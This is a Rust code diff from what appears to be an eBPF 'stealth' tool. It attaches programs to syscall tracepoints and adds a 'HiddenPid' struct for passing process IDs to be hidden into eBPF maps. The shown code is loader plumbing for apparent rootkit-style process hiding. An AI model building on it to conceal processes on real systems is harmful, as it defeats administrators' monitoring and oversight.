@@ -3,9 +3,11 @@ use std::{collections::HashSet, fs::OpenOptions, io::Write, path::Path};
 use anyhow::{anyhow, Error};
 use aya::{
     programs::{ProgramInfo, TracePoint},
-    Ebpf,
+    Ebpf, Pod,
 };
 use libbpf_rs::query::{MapInfoIter, ProgInfoIter};
+use log::debug;
+use stealth_common::MAX_PID_LENGTH;
 use sysinfo::{Pid, Process, System};
 #[inline]
 pub fn list_active_programs() -> Vec<u32> {
@@ -64,7 +66,6 @@ impl Builder<'_> {
 
             program.load()?;
             program.attach("syscalls", &tp.syscall_name)?;
-
             programs_info.push(program.info()?)
         }
         Ok(programs_info)
@@ -77,7 +78,24 @@ pub struct BpfProgInfos {
     pub map_ids: Vec<u32>,
 }
 
-pub fn fetch_pids_map_ids(progs_info: Vec<ProgramInfo>) -> Result<BpfProgInfos, Error> {
+#[repr(C)]
+#[derive(Copy, Clone)]
+pub struct HiddenPid {
+    bytes: [u8; MAX_PID_LENGTH as usize],
+    len: usize,
+}
+impl HiddenPid {
+    pub fn new(str_repr: &str) -> Self {
+        let mut bytes = [0u8; MAX_PID_LENGTH as usize];
+        let len = str_repr.len().min(MAX_PID_LENGTH as usize);
+        bytes[..len].copy_from_slice(str_repr.as_bytes());
+        debug!("{}", unsafe { std::str::from_utf8_unchecked(&bytes) });
+        Self { bytes, len }
+    }
+}
+unsafe impl Pod for HiddenPid {}
+
+pub fn fetch_prog_ids_map_ids(progs_info: Vec<ProgramInfo>) -> Result<BpfProgInfos, Error> {
     let mut prog_ids = vec![];
     let mut map_ids = vec![];
     for pinfo in progs_info {
